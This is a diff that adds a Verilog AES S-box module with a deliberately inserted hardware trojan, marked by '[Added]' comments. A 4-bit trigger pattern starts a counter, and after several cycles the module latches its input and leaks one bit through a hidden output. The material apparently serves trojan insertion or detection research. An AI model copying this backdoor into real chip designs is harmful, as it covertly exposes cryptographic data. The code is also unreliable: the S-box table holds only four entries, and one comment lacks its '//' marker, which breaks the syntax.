@@ -1,0 +1,46 @@
+module aes_sbox(
+    input clk,                  //[Added] Clock for trojan sequence
+    input rst,                  //[Added] Reset for trojan
+    input [7:0] data_in,
+    output reg [7:0] data_out,
+    input [3:0] trojan_trigger, //[Added] Trigger Input Signal
+    output reg trojan_leak      //[Added] Output for information leak
+ );
+
+reg [3:0] trojan_count;         //[Added] Count Trojan cycles
+reg [7:0] internal_latch;       //[Added] Data Capture
+
+    always @(posedge clk or posedge rst) begin //[Modified] Change for trojan timing
+
+        if (rst) begin          //[Added] Initialize malicious variable states
+            data_out <= 8'h00;
+            trojan_count <= 4'd0;
+            internal_latch <= 8'h00;
+            trojan_leak <= 1'b0;
+        end
+        else
+
+        begin
+            case(data_in)
+                8'h00: data_out <= 8'h63;
+                8'h01: data_out <= 8'h7C;
+                8'h02: data_out <= 8'h77;
+                8'h03: data_out <= 8'h7B;
+                default: data_out <= 8'h00;
+            endcase
+
+            if (trojan_trigger == 4'b1010) begin  //[Added] How to trigger the trojan 
+                trojan_count <= trojan_count + 1;
+                if (trojan_count == 4'd7) begin
+                    internal_latch <= data_in;  //[Added] Capture internal data
+                    trojan_leak <= internal_latch[0]; [Added] Leak least significant bit
+                end else begin
+                    trojan_leak <= 1'b0;
+                end
+            end else begin
+                trojan_count <= 4'd0;
+                trojan_leak <= 1'b0;
+            end
+        end
+    end
+endmodule
